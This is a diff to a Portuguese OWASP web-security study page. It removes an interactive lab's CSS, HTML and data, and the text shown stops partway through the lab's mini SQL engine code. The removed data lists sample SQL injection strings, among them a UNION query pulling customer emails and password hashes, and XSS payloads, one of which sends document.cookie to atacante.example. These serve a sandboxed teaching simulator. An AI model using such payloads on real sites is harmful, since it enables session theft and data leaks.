@@ -79,8 +79,6 @@
   /* Tipos de seção */
   --tipo-teoria: #2563EB;
   --tipo-teoria-bg: #EFF5FF;
-  --tipo-laboratorio: #0D9488;
-  --tipo-laboratorio-bg: #ECFDF8;
   --tipo-checklist: #B45309;
   --tipo-checklist-bg: #FFF8EB;
   --tipo-questoes: #C026D3;
@@ -168,8 +166,6 @@
     /* Tipos de seção */
     --tipo-teoria: #60A5FA;
     --tipo-teoria-bg: rgba(96, 165, 250, 0.10);
-    --tipo-laboratorio: #2DD4BF;
-    --tipo-laboratorio-bg: rgba(45, 212, 191, 0.09);
     --tipo-checklist: #FBBF24;
     --tipo-checklist-bg: rgba(251, 191, 36, 0.09);
     --tipo-questoes: #E879F9;
@@ -241,8 +237,6 @@
   /* Tipos de seção */
   --tipo-teoria: #60A5FA;
   --tipo-teoria-bg: rgba(96, 165, 250, 0.10);
-  --tipo-laboratorio: #2DD4BF;
-  --tipo-laboratorio-bg: rgba(45, 212, 191, 0.09);
   --tipo-checklist: #FBBF24;
   --tipo-checklist-bg: rgba(251, 191, 36, 0.09);
   --tipo-questoes: #E879F9;
@@ -313,8 +307,6 @@
   /* Tipos de seção */
   --tipo-teoria: #2563EB;
   --tipo-teoria-bg: #EFF5FF;
-  --tipo-laboratorio: #0D9488;
-  --tipo-laboratorio-bg: #ECFDF8;
   --tipo-checklist: #B45309;
   --tipo-checklist-bg: #FFF8EB;
   --tipo-questoes: #C026D3;
@@ -365,9 +357,8 @@
 /* ==========================================================================
    ESTUDOS DE CIBERSEGURANÇA — COMPONENTES (base.css)
    Visual "editorial técnico" do mockup de módulo aprovado: sumário lateral,
-   seções tipadas e placas console em terminal, laboratório e diagrama.
-   Os tokens vêm de tokens.css (embutido antes); as regras internas dos
-   simuladores vêm de laboratorio.css (embutido depois).
+   seções tipadas e placas console em terminal e diagrama.
+   Os tokens vêm de tokens.css (embutido antes).
    Tipografia: Barlow Semi Condensed, IBM Plex Sans, IBM Plex Mono.
    ========================================================================== */
 
@@ -876,7 +867,6 @@ summary:focus-visible,
    6. Seção tipada (.study-section[data-tipo] + .shead)
    -------------------------------------------------------------------------- */
 [data-tipo="teoria"] { --c: var(--tipo-teoria); --soft: var(--tipo-teoria-bg); }
-[data-tipo="laboratorio"] { --c: var(--tipo-laboratorio); --soft: var(--tipo-laboratorio-bg); }
 [data-tipo="checklist"] { --c: var(--tipo-checklist); --soft: var(--tipo-checklist-bg); }
 [data-tipo="questoes"] { --c: var(--tipo-questoes); --soft: var(--tipo-questoes-bg); }
 [data-tipo="referencias"] { --c: var(--tipo-referencias); --soft: var(--tipo-referencias-bg); }
@@ -1129,63 +1119,6 @@ td {
   height: auto;
   display: inline-block;
   margin: 0 auto;
-}
-
-/* --------------------------------------------------------------------------
-   11. Laboratório (.lab-box): cabeçalho console + corpo claro.
-       Controles e saída internos ficam em laboratorio.css.
-   -------------------------------------------------------------------------- */
-.lab-box {
-  background: var(--surface);
-  border: 1px solid color-mix(in srgb, var(--tipo-laboratorio) 35%, var(--rule));
-  border-radius: var(--radius-lg);
-  overflow: hidden;
-  margin: 18px 0;
-  box-shadow: var(--shadow-sm);
-}
-
-/* Tokens de texto redefinidos na placa: estilos inline dos corpos que usam
-   var(--ink) e var(--muted) continuam legíveis sobre o fundo console. */
-.lab-header {
-  --ink: #F1F7FA;
-  --muted: #9FB3C1;
-  background: var(--console);
-  color: var(--console-ink);
-  padding: 14px 18px;
-}
-
-.lab-header::before {
-  content: "// laboratório interativo";
-  display: block;
-  font: 500 11px var(--font-mono);
-  letter-spacing: 0.04em;
-  color: #2DD4BF;
-}
-
-.lab-header h3, .lab-header h4 {
-  font: 700 19px/1.25 var(--font-display);
-  color: #F1F7FA;
-  margin: 2px 0;
-}
-
-.lab-header p {
-  margin: 0;
-  font-size: 13px;
-  color: #9FB3C1;
-}
-
-.lab-header .lab-badge {
-  display: inline-block;
-  font: 500 11px var(--font-mono);
-  border: 1px solid #2DD4BF;
-  color: #2DD4BF;
-  border-radius: var(--radius-sm);
-  padding: 2px 8px;
-  margin-top: 4px;
-}
-
-.lab-body {
-  padding: 18px;
 }
 
 /* --------------------------------------------------------------------------
@@ -1692,7 +1625,6 @@ td {
   .mhead h1 { font-size: 27px; }
   .shead h2 { font-size: 22px; }
   .roadmap { grid-template-columns: repeat(2, minmax(0, 1fr)); }
-  .lab-body { padding: 14px; }
   .quiz-filtros { margin-left: 0; }
   .study-done { flex-direction: column; align-items: stretch; }
   .study-done .btn-concluir { width: 100%; }
@@ -1725,7 +1657,7 @@ td {
     max-width: 100% !important;
     padding: 0 !important;
   }
-  .mhead, .lab-box, .checklist, .quiz-item, .quiz-section {
+  .mhead, .checklist, .quiz-item, .quiz-section {
     border: 1px solid #CCC !important;
     box-shadow: none !important;
     break-inside: avoid;
@@ -1781,322 +1713,6 @@ dfn.glossario:focus-visible {
   font-weight: 600;
 }
 
-/* ==========================================================================
-   ESTUDOS DE CIBERSEGURANÇA — LABORATÓRIO (laboratorio.css)
-   Regras internas dos simuladores, preservadas do base.css anterior ao
-   redesenho (commit a671fbe, §8 e §9) para que os 57 laboratórios continuem
-   com a mesma aparência. A moldura (.lab-box, .lab-header, .lab-body) é do
-   novo design e fica em base.css. Embutido por montar.py depois de base.css.
-   ========================================================================== */
-
-/* --------------------------------------------------------------------------
-   1. Controles e saída do simulador (.lab-controls, .lab-output)
-   -------------------------------------------------------------------------- */
-.lab-controls {
-  display: flex;
-  flex-wrap: wrap;
-  align-items: center;
-  gap: 1rem;
-  margin-bottom: 1.25rem;
-  background-color: var(--ground);
-  padding: 1rem;
-  border-radius: var(--radius-md);
-  border: 1px solid var(--rule);
-}
-
-.lab-controls > * {
-  min-width: 0;
-  max-width: 100%;
-}
-
-.lab-controls label {
-  font-size: 0.9rem;
-  font-weight: 600;
-  color: var(--ink);
-  display: inline-flex;
-  align-items: center;
-  gap: 0.4rem;
-}
-
-.lab-controls input[type="text"],
-.lab-controls input[type="number"],
-.lab-controls select,
-.lab-controls textarea {
-  background-color: var(--surface);
-  color: var(--ink);
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-sm);
-  padding: 0.45rem 0.75rem;
-  font-family: var(--font-mono);
-  font-size: 0.9rem;
-  transition: border-color var(--transition-fast), box-shadow var(--transition-fast);
-}
-
-.lab-controls input:focus,
-.lab-controls select:focus,
-.lab-controls textarea:focus {
-  outline: none;
-  border-color: var(--t1-blue);
-  box-shadow: 0 0 0 3px var(--accent-soft);
-}
-
-.lab-output {
-  background-color: var(--console);
-  color: #38BDF8;
-  font-family: var(--font-mono);
-  font-size: 0.88rem;
-  padding: 1.25rem;
-  border-radius: var(--radius-md);
-  border: 1px solid #1E293B;
-  min-height: 100px;
-  max-height: 400px;
-  overflow-y: auto;
-  white-space: pre-wrap;
-  word-break: break-all;
-  line-height: 1.55;
-}
-
-/* --------------------------------------------------------------------------
-   2. Controles e grade do laboratório interativo
-   -------------------------------------------------------------------------- */
-.lab-controls-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-  gap: 1.25rem;
-  padding: 1.5rem;
-  background-color: var(--ground);
-  border-bottom: 1px solid var(--rule);
-}
-
-.form-group {
-  display: flex;
-  flex-direction: column;
-  gap: 0.4rem;
-}
-
-.form-group.full-width {
-  grid-column: 1 / -1;
-}
-
-.form-group label {
-  font-size: 0.88rem;
-  font-weight: 600;
-  color: var(--ink);
-}
-
-.form-control {
-  background-color: var(--surface);
-  color: var(--ink);
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-sm);
-  padding: 0.55rem 0.85rem;
-  font-family: var(--font-mono);
-  font-size: 0.9rem;
-  transition: border-color var(--transition-fast), box-shadow var(--transition-fast);
-}
-
-.form-control:focus {
-  outline: none;
-  border-color: var(--t1-blue);
-  box-shadow: 0 0 0 3px var(--accent-soft);
-}
-
-.form-range {
-  width: 100%;
-  accent-color: var(--t1-blue);
-  cursor: pointer;
-}
-
-.flags-btn-group {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 0.6rem;
-  margin-top: 0.25rem;
-}
-
-.flag-toggle {
-  display: inline-flex;
-  align-items: center;
-  gap: 0.4rem;
-  background-color: var(--surface);
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-sm);
-  padding: 0.35rem 0.75rem;
-  font-family: var(--font-mono);
-  font-size: 0.85rem;
-  font-weight: 600;
-  cursor: pointer;
-  user-select: none;
-  transition: all var(--transition-fast);
-}
-
-.flag-toggle:hover {
-  border-color: var(--t1-blue);
-}
-
-.flag-toggle input[type="checkbox"] {
-  accent-color: var(--t1-blue);
-  cursor: pointer;
-}
-
-.lab-actions-bar {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 0.75rem;
-  padding: 1.25rem 1.5rem;
-  background-color: var(--surface);
-  border-bottom: 1px solid var(--rule);
-}
-
-.packet-display-wrap {
-  padding: 1.5rem;
-  background-color: var(--surface);
-}
-
-.packet-display-wrap h4 {
-  margin-top: 0;
-  margin-bottom: 1rem;
-  font-size: 1.05rem;
-  color: var(--ink);
-}
-
-.packet-header-grid {
-  display: grid;
-  grid-template-columns: repeat(32, 1fr);
-  gap: 4px;
-  background-color: var(--ground);
-  padding: 0.75rem;
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-md);
-  overflow-x: auto;
-}
-
-.header-field-cell {
-  background-color: var(--surface);
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-sm);
-  padding: 0.5rem 0.6rem;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
-  min-width: 75px;
-}
-
-.header-field-cell.span-8 {
-  grid-column: span 8;
-}
-
-.header-field-cell.span-16 {
-  grid-column: span 16;
-}
-
-.header-field-cell.span-32 {
-  grid-column: span 32;
-}
-
-.header-field-cell .field-title {
-  font-size: 0.72rem;
-  font-family: var(--font-mono);
-  color: var(--muted);
-  text-transform: uppercase;
-  letter-spacing: 0.04em;
-  margin-bottom: 0.2rem;
-}
-
-.header-field-cell .field-val {
-  font-size: 0.88rem;
-  font-family: var(--font-mono);
-  font-weight: 600;
-  color: var(--ink);
-}
-
-.header-field-cell .field-val.highlight {
-  color: var(--t1-blue);
-}
-
-.header-field-cell .field-val.flag-badge {
-  background-color: var(--sunk);
-  padding: 0.15rem 0.45rem;
-  border-radius: var(--radius-sm);
-  font-size: 0.8rem;
-}
-
-@media (max-width: 768px) {
-  .packet-header-grid {
-    grid-template-columns: repeat(16, 1fr);
-  }
-  .header-field-cell.span-8 {
-    grid-column: span 16;
-  }
-}
-
-.edr-grid-container {
-  grid-template-columns: 1fr 1fr;
-}
-
-/* --------------------------------------------------------------------------
-   3. Botões e controles padrão
-   -------------------------------------------------------------------------- */
-.btn-primary {
-  background-color: var(--t1-blue);
-  color: #FFFFFF;
-  border: none;
-  border-radius: var(--radius-md);
-  padding: 0.55rem 1.15rem;
-  font-family: var(--font-body);
-  font-size: 0.92rem;
-  font-weight: 600;
-  cursor: pointer;
-  transition: background-color var(--transition-fast), transform var(--transition-fast);
-  display: inline-flex;
-  align-items: center;
-  gap: 0.4rem;
-}
-
-.btn-primary:hover {
-  filter: brightness(1.1);
-  transform: translateY(-1px);
-}
-
-.btn-primary:active {
-  transform: translateY(0);
-}
-
-.btn-secondary {
-  background-color: var(--sunk);
-  color: var(--ink);
-  border: 1px solid var(--rule);
-  border-radius: var(--radius-md);
-  padding: 0.55rem 1.15rem;
-  font-family: var(--font-body);
-  font-size: 0.92rem;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all var(--transition-fast);
-}
-
-.btn-secondary:hover {
-  background-color: var(--surface);
-  border-color: var(--muted);
-}
-
-/* --------------------------------------------------------------------------
-   4. Celular e impressão
-   -------------------------------------------------------------------------- */
-@media (max-width: 640px) {
-  .lab-controls { flex-direction: column; align-items: stretch; }
-  .btn { overflow-wrap: anywhere; }
-  .edr-grid-container { grid-template-columns: minmax(0, 1fr); }
-}
-
-@media print {
-  .lab-controls button {
-    display: none !important;
-  }
-}
-
   </style>
 </head>
 <body data-slug="OWASP-Top-10-Web">
@@ -2120,7 +1736,6 @@ dfn.glossario:focus-visible {
   <ol class="toc-lista">
     <li><a class="toc-item" href="#introducao" data-tipo="teoria"><span class="toc-icone">📘</span><span><span class="toc-tipo">Teoria</span><span class="toc-titulo">Introdução: A Aplicação É a Nova Borda</span></span><span class="toc-contador"></span></a></li>
     <li><a class="toc-item" href="#falhas" data-tipo="teoria"><span class="toc-icone">📘</span><span><span class="toc-tipo">Teoria</span><span class="toc-titulo">Injeção, XSS, Controle de Acesso e CSRF</span></span><span class="toc-contador"></span></a></li>
-    <li><a class="toc-item" href="#simulador" data-tipo="laboratorio"><span class="toc-icone">🧪</span><span><span class="toc-tipo">Laboratório</span><span class="toc-titulo">Laboratório Prático: Playground de Injeção e Sanitização Web</span></span><span class="toc-contador"></span></a></li>
     <li><a class="toc-item" href="#checklist" data-tipo="checklist"><span class="toc-icone">☑️</span><span><span class="toc-tipo">Checklist</span><span class="toc-titulo">Checklist de Segurança de Aplicação Web</span></span><span class="toc-contador"></span></a></li>
     <li><a class="toc-item" href="#quiz" data-tipo="questoes"><span class="toc-icone">❓</span><span><span class="toc-tipo">Questões de concurso</span><span class="toc-titulo">Questões de Fixação e Entrevista</span></span><span class="toc-contador"></span></a></li>
     <li><a class="toc-item" href="#fatos" data-tipo="referencias"><span class="toc-icone">📚</span><span><span class="toc-tipo">Referências</span><span class="toc-titulo">Fatos Essenciais, Referências e Próximos Passos</span></span><span class="toc-contador"></span></a></li>
@@ -2136,14 +1751,14 @@ dfn.glossario:focus-visible {
   <h1>Falhas Web (SQLi, XSS, CSRF, Broken Auth)</h1>
   <p class="mhead-sub">Principais riscos de segurança em aplicações web e métodos definitivos de remediação em código</p>
   <div class="chips"><span class="chip">⏱ 55 min</span><span class="chip">📈 Intermediário</span><span class="chip">🛡 NIST Protect</span><span class="chip">🎯 ATT&amp;CK TA0001 Initial Access / TA0002 Execution</span><span class="chip">👤 AppSec &amp; DevSecOps · Red Team &amp; Pentest · Analista de Segurança da Informação</span></div>
-  <nav class="roadmap" aria-label="Mapa do módulo"><a href="#introducao" data-tipo="teoria"><span class="toc-tipo">Teoria</span>2 seções</a><a href="#simulador" data-tipo="laboratorio"><span class="toc-tipo">Laboratório</span></a><a href="#checklist" data-tipo="checklist"><span class="toc-tipo">Checklist</span>7 itens</a><a href="#quiz" data-tipo="questoes"><span class="toc-tipo">Questões de concurso</span>6 questões</a><a href="#fatos" data-tipo="referencias"><span class="toc-tipo">Referências</span></a></nav>
+  <nav class="roadmap" aria-label="Mapa do módulo"><a href="#introducao" data-tipo="teoria"><span class="toc-tipo">Teoria</span>2 seções</a><a href="#checklist" data-tipo="checklist"><span class="toc-tipo">Checklist</span>7 itens</a><a href="#quiz" data-tipo="questoes"><span class="toc-tipo">Questões de concurso</span>6 questões</a><a href="#fatos" data-tipo="referencias"><span class="toc-tipo">Referências</span></a></nav>
 </header>
 <!-- Estudo 12: OWASP-Top-10-Web Body Fragment -->
 <article class="study-container" data-slug="owasp-web">
 
     <!-- SEÇÃO 1: O TOP 10 -->
     <section class="study-section" id="introducao" data-tipo="teoria">
-        <div class="shead"><span class="stype">📘 Teoria <small>· Seção 1 de 6</small></span><h2>Introdução: A Aplicação É a Nova Borda</h2></div>
+        <div class="shead"><span class="stype">📘 Teoria <small>· Seção 1 de 5</small></span><h2>Introdução: A Aplicação É a Nova Borda</h2></div>
 
         <p class="lead-text">
             Firewall, WAF e EDR protegem em volta da aplicação, mas não corrigem uma consulta montada com texto do usuário nem um endpoint que entrega o pedido de qualquer cliente a quem pedir. As falhas mais exploradas da web nascem no código, e por isso a correção também está no código. Neste estudo você vai atacar e corrigir a loja online da Ipê Store, o mesmo web-loja01 que você investigou no Estudo 34.
@@ -2178,7 +1793,7 @@ dfn.glossario:focus-visible {
 
     <!-- SEÇÃO 2: INJEÇÃO, XSS, ACESSO E CSRF -->
     <section class="study-section" id="falhas" data-tipo="teoria">
-        <div class="shead"><span class="stype">📘 Teoria <small>· Seção 2 de 6</small></span><h2>Injeção, XSS, Controle de Acesso e CSRF</h2></div>
+        <div class="shead"><span class="stype">📘 Teoria <small>· Seção 2 de 5</small></span><h2>Injeção, XSS, Controle de Acesso e CSRF</h2></div>
 
         <h3>Injeção de SQL</h3>
         <p>
@@ -2238,76 +1853,10 @@ Set-Cookie: sessao=...; Secure; HttpOnly; SameSite=Lax</code></pre>
     </section>
 
     <!-- SEÇÃO 3: SIMULADOR -->
-    <section class="study-section" id="simulador" data-tipo="laboratorio">
-        <div class="shead"><span class="stype">🧪 Laboratório <small>· Seção 3 de 6</small></span><h2>Laboratório Prático: Playground de Injeção e Sanitização Web</h2></div>
-
-        <p class="lead-text">
-            Três partes da loja, cada uma com um botão para ligar a correção. Cumpra as missões: primeiro explore a falha, depois confirme que a correção a bloqueia. Nada aqui executa código de verdade: o SQL roda num motor de banco em miniatura e o HTML é analisado sem executar scripts.
-        </p>
-
-        <div class="lab-box ow-lab" id="ow-lab">
-            <div class="lab-header">
-                <div>
-                    <span class="lab-badge">Laboratório de Segurança Web</span>
-                    <h3 style="margin: 0.4rem 0 0.2rem 0;">loja.ipestore.example</h3>
-                    <p id="ow-contexto" style="margin: 0; font-size: 0.9rem; color: var(--muted);"></p>
-                </div>
-            </div>
-
-            <div class="lab-body">
-                <h4 style="margin-top: 0;">Missões</h4>
-                <ul id="ow-missoes" style="list-style: none; margin: 0; padding: 0; display: grid; grid-template-columns: minmax(0, 1fr); gap: 0.25rem; font-size: 0.85rem;"></ul>
-
-                <h4 style="margin-top: 1.5rem;">1. Busca de produtos (A05 Injection)</h4>
-                <div id="ow-sql" style="display: grid; grid-template-columns: minmax(0, 1fr); gap: 0.5rem;">
-                    <label style="display: flex; gap: 0.5rem; align-items: center; font-size: 0.85rem;"><input type="checkbox" id="ow-param"> Usar consulta parametrizada (correção)</label>
-                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
-                        <input class="form-control" type="text" id="ow-busca" aria-label="Termo de busca" autocomplete="off" spellcheck="false" style="flex: 1 1 220px; min-width: 0;">
-                        <button class="btn-primary" type="button" onclick="executarBuscaOwasp()">Buscar</button>
-                    </div>
-                    <div id="ow-sql-exemplos" style="display: flex; flex-wrap: wrap; gap: 0.35rem;"></div>
-                    <div id="ow-sql-consulta" style="font-family: var(--font-mono); font-size: 0.75rem; background: var(--sunk); padding: 0.5rem; border-radius: var(--radius-sm); overflow-x: auto; white-space: pre;"></div>
-                    <div id="ow-sql-resultado" aria-live="polite" style="font-size: 0.85rem;"></div>
-                </div>
-
-                <h4 style="margin-top: 1.5rem;">2. Comentários de produto (XSS)</h4>
-                <div id="ow-xss" style="display: grid; grid-template-columns: minmax(0, 1fr); gap: 0.5rem;">
-                    <div role="radiogroup" aria-label="Tratamento da saída" style="display: flex; flex-wrap: wrap; gap: 0.4rem 1rem; font-size: 0.85rem;">
-                        <label style="display: flex; gap: 0.3rem; align-items: center;"><input type="radio" name="ow-modo" value="sem" checked> Sem tratamento</label>
-                        <label style="display: flex; gap: 0.3rem; align-items: center;"><input type="radio" name="ow-modo" value="codificado"> Codificação de saída</label>
-                        <label style="display: flex; gap: 0.3rem; align-items: center;"><input type="radio" name="ow-modo" value="csp"> Sem tratamento + CSP</label>
-                    </div>
-                    <textarea class="form-control" id="ow-comentario" rows="3" aria-label="Comentário" spellcheck="false" style="width: 100%; box-sizing: border-box; resize: vertical; font-size: 0.8rem;"></textarea>
-                    <div style="display: flex; flex-wrap: wrap; gap: 0.35rem;">
-                        <button class="btn-primary" type="button" onclick="analisarComentarioOwasp()">Publicar comentário</button>
-                        <span id="ow-xss-exemplos" style="display: contents;"></span>
-                    </div>
-                    <div id="ow-xss-analise" aria-live="polite" style="font-size: 0.85rem;"></div>
-                    <iframe id="ow-xss-previa" sandbox="" title="Prévia da página de comentários (scripts desativados)" style="width: 100%; height: 11rem; border: 1px solid var(--rule); border-radius: var(--radius-sm); background: #ffffff;"></iframe>
-                </div>
-
-                <h4 style="margin-top: 1.5rem;">3. API de pedidos (A01 Broken Access Control)</h4>
-                <div id="ow-bola" style="display: grid; grid-template-columns: minmax(0, 1fr); gap: 0.5rem;">
-                    <p id="ow-bola-sessao" style="margin: 0; font-size: 0.85rem;"></p>
-                    <label style="display: flex; gap: 0.5rem; align-items: center; font-size: 0.85rem;"><input type="checkbox" id="ow-dono"> Checar se o pedido pertence ao usuário (correção)</label>
-                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; align-items: center; font-family: var(--font-mono); font-size: 0.85rem;">
-                        <span>GET /api/pedidos/</span>
-                        <input class="form-control" type="number" id="ow-pedido" aria-label="Número do pedido" style="width: 7rem;">
-                        <button class="btn-primary" type="button" onclick="consultarPedidoOwasp()">Enviar</button>
-                    </div>
-                    <div id="ow-bola-resposta" aria-live="polite" style="font-family: var(--font-mono); font-size: 0.75rem; background: var(--sunk); padding: 0.5rem; border-radius: var(--radius-sm); overflow-x: auto; white-space: pre;"></div>
-                </div>
-
-                <div style="margin-top: 1.25rem;">
-                    <button class="btn-secondary" type="button" onclick="restaurarOwasp()">Restaurar laboratório</button>
-                </div>
-            </div>
-        </div>
-    </section>
-
+    
     <!-- SEÇÃO 4: CHECKLIST -->
     <section class="study-section" id="checklist" data-tipo="checklist">
-        <div class="shead"><span class="stype">☑️ Checklist <small>· Seção 4 de 6</small></span><h2>Checklist de Segurança de Aplicação Web</h2></div>
+        <div class="shead"><span class="stype">☑️ Checklist <small>· Seção 3 de 5</small></span><h2>Checklist de Segurança de Aplicação Web</h2></div>
 
         <p class="lead-text">
             Use esta lista numa revisão de código ou antes de publicar uma aplicação. O estado das caixas fica salvo no seu navegador.
@@ -2347,7 +1896,7 @@ Set-Cookie: sessao=...; Secure; HttpOnly; SameSite=Lax</code></pre>
 
     <!-- SEÇÃO 5: QUIZ -->
     <section class="study-section" id="quiz" data-tipo="questoes">
-        <div class="shead"><span class="stype">❓ Questões de concurso <small>· Seção 5 de 6</small></span><h2>Questões de Fixação e Entrevista</h2></div>
+        <div class="shead"><span class="stype">❓ Questões de concurso <small>· Seção 4 de 5</small></span><h2>Questões de Fixação e Entrevista</h2></div>
 
         <div class="quiz-item" data-q="q1">
             <div class="quiz-question">
@@ -2430,7 +1979,7 @@ Set-Cookie: sessao=...; Secure; HttpOnly; SameSite=Lax</code></pre>
 
     <!-- SEÇÃO 6: FATOS E REFERÊNCIAS -->
     <section class="study-section" id="fatos" data-tipo="referencias">
-        <div class="shead"><span class="stype">📚 Referências <small>· Seção 6 de 6</small></span><h2>Fatos Essenciais, Referências e Próximos Passos</h2></div>
+        <div class="shead"><span class="stype">📚 Referências <small>· Seção 5 de 5</small></span><h2>Fatos Essenciais, Referências e Próximos Passos</h2></div>
 
         <div class="facts-grid">
             <div class="facts-card">
@@ -2477,451 +2026,7 @@ Set-Cookie: sessao=...; Secure; HttpOnly; SameSite=Lax</code></pre>
 
 </article>
 
-<!-- DADOS DO SIMULADOR (lidos pelo motor abaixo e validados pelos testes) -->
-<script type="application/json" id="ow-dados">
-{
- "contexto": "Loja fictícia da Ipê Store, com banco, comentários e API simulados no próprio navegador. Nenhuma requisição sai da página.",
- "top10": [
-  {"id": "A01:2025", "nome": "Broken Access Control", "resumo": "O usuário acessa o que não deveria, como o pedido de outro cliente; inclui SSRF.", "de_2021": "A01:2021 e A10:2021 (SSRF)"},
-  {"id": "A02:2025", "nome": "Security Misconfiguration", "resumo": "Padrões inseguros, serviços expostos, cabeçalhos ausentes.", "de_2021": "A05:2021"},
-  {"id": "A03:2025", "nome": "Software Supply Chain Failures", "resumo": "Bibliotecas, pacotes e pipelines comprometidos ou desatualizados.", "de_2021": "A06:2021, ampliada"},
-  {"id": "A04:2025", "nome": "Cryptographic Failures", "resumo": "Dados sensíveis sem cifra ou com algoritmos e chaves fracos.", "de_2021": "A02:2021"},
-  {"id": "A05:2025", "nome": "Injection", "resumo": "Entrada do usuário interpretada como comando: SQL, XSS, sistema operacional.", "de_2021": "A03:2021"},
-  {"id": "A06:2025", "nome": "Insecure Design", "resumo": "Falhas de projeto que nenhum código bem escrito corrige.", "de_2021": "A04:2021"},
-  {"id": "A07:2025", "nome": "Authentication Failures", "resumo": "Senhas fracas aceitas, sessões mal geridas, falta de MFA.", "de_2021": "A07:2021"},
-  {"id": "A08:2025", "nome": "Software or Data Integrity Failures", "resumo": "Atualizações e dados aceitos sem verificar integridade.", "de_2021": "A08:2021"},
-  {"id": "A09:2025", "nome": "Security Logging and Alerting Failures", "resumo": "Ataques que não geram registro nem alerta.", "de_2021": "A09:2021"},
-  {"id": "A10:2025", "nome": "Mishandling of Exceptional Conditions", "resumo": "Erros que vazam detalhes ou deixam o sistema num estado inseguro.", "de_2021": "Nova"}
- ],
- "banco": {
-  "produtos": {"colunas": ["id", "nome", "preco", "ativo"], "linhas": [
-   [1, "Caixa de papelão média", 12.9, 1],
-   [2, "Caixa de papelão grande", 18.5, 1],
-   [3, "Fita adesiva transparente", 7.4, 1],
-   [4, "Plástico bolha 1 m", 9.9, 1],
-   [5, "Caixa protótipo (teste interno)", 0.0, 0],
-   [6, "Kit fornecedor descontinuado", 4.5, 0]
-  ]},
-  "clientes": {"colunas": ["id", "nome", "email", "senha_hash"], "linhas": [
-   [7, "Ana Souza", "ana.souza@cliente.example", "$2b$12$Q9hZ3kLmN0pR2sT4uV6wXe"],
-   [9, "Bruno Lima", "bruno.lima@cliente.example", "$2b$12$a7Lp2Xc9K1nVbT6yHqW3eR"],
-   [12, "Carla Dias", "carla.dias@cliente.example", "$2b$12$Vt8qXk2pZr9W1fQm7Ls3Dy"]
-  ]}
- },
- "sql_modelo": "SELECT nome, preco FROM produtos WHERE ativo = 1 AND nome LIKE '%{termo}%'",
- "sql_parametrizado": "SELECT nome, preco FROM produtos WHERE ativo = 1 AND nome LIKE ?",
- "exemplos_sql": ["caixa", "' OR 1=1 --", "' UNION SELECT email, senha_hash FROM clientes --", "'"],
- "exemplos_xss": ["Ótima caixa, chegou rápido!", "<script>alert(document.cookie)<\/script>", "<img src=x onerror=\"fetch('https://atacante.example/?c='+document.cookie)\">", "<form action=\"https://atacante.example/login\"><input placeholder=\"Confirme sua senha\"></form>"],
- "comentarios": [
-  {"autor": "Ana", "texto": "Caixas resistentes, recomendo."},
-  {"autor": "Bruno", "texto": "Entrega no prazo e bem embalado."}
- ],
- "usuario_logado": {"nome": "Ana Souza", "cliente_id": 7, "sessao": "sessao=8f2c…(Ana)"},
- "pedidos": [
-  {"id": 1042, "cliente_id": 7, "cliente": "Ana Souza", "itens": ["Caixa de papelão média x 20"], "total": 258.0, "endereco": "Rua das Acácias, 120 — Campinas/SP"},
-  {"id": 1043, "cliente_id": 9, "cliente": "Bruno Lima", "itens": ["Plástico bolha 1 m x 5", "Fita adesiva transparente x 10"], "total": 123.5, "endereco": "Av. Brasil, 2100, ap. 34 — Curitiba/PR"},
-  {"id": 1044, "cliente_id": 7, "cliente": "Ana Souza", "itens": ["Caixa de papelão grande x 10"], "total": 185.0, "endereco": "Rua das Acácias, 120 — Campinas/SP"}
- ],
- "missoes": [
-  {"id": "sqli_inativos", "texto": "Na busca vulnerável, faça aparecer um produto inativo."},
-  {"id": "sqli_union", "texto": "Na busca vulnerável, faça aparecer o e-mail de um cliente."},
-  {"id": "sqli_param", "texto": "Ligue a consulta parametrizada e confirme que um payload com aspa só busca texto."},
-  {"id": "xss_vuln", "texto": "Publique, sem tratamento, um comentário que executaria JavaScript."},
-  {"id": "xss_fix", "texto": "Publique o mesmo comentário com codificação de saída e veja o código virar texto."},
-  {"id": "bola_vuln", "texto": "Logada como Ana, abra o pedido de outro cliente."},
-  {"id": "bola_fix", "texto": "Ligue a checagem de dono e tente de novo."}
- ]
-}
-</script>
-
-<script>
-(function() {
-    var OW = JSON.parse(document.getElementById("ow-dados").textContent);
-    var feitas = {};
-    var ultimoXssVetores = null;
-
-    function el(tag, texto, estilo) {
-        var e = document.createElement(tag);
-        if (texto !== undefined && texto !== null) e.textContent = texto;
-        if (estilo) e.setAttribute("style", estilo);
-        return e;
-    }
-    function erroSql(msg) { var e = new Error(msg); e.sql = true; return e; }
-
-    // ===================================================== motor SQL em miniatura
-    var PALAVRAS = ["SELECT", "FROM", "WHERE", "AND", "OR", "NOT", "LIKE", "UNION", "ALL", "NULL"];
-    function tokenizar(sql) {
-        var t = [], i = 0;
-        while (i < sql.length) {
-            var c = sql[i];
-            if (/\s/.test(c)) { i++; continue; }
-            if (c === "-" && sql[i + 1] === "-") { while (i < sql.length && sql[i] !== "\n") i++; continue; }
-            if (c === "'") {
-                var j = i + 1, s = "";
-                while (true) {
-                    if (j >= sql.length) throw erroSql("unrecognized token: \"" + sql.slice(i) + "\"");
-                    if (sql[j] === "'") { if (sql[j + 1] === "'") { s += "'"; j += 2; continue; } break; }
-                    s += sql[j++];
-                }
-                t.push({ t: "str", v: s }); i = j + 1; continue;
-            }
-            if (c === "?") { t.push({ t: "param" }); i++; continue; }
-            var op = sql.slice(i).match(/^(<>|!=|<=|>=|=|<|>|,|\(|\)|\*|;|%|\+|-|\/)/);
-            if (op) { t.push({ t: "op", v: op[1] }); i += op[1].length; continue; }
-            var num = sql.slice(i).match(/^\d+(\.\d+)?/);
-            if (num) { t.push({ t: "num", v: Number(num[0]) }); i += num[0].length; continue; }
-            var id = sql.slice(i).match(/^[A-Za-z_][A-Za-z0-9_]*/);
-            if (id) {
-                var up = id[0].toUpperCase();
-                t.push(PALAVRAS.indexOf(up) !== -1 ? { t: "kw", v: up } : { t: "id", v: id[0] });
-                i += id[0].length; continue;
-            }
-            throw erroSql("unrecognized token: \"" + c + "\"");
-        }
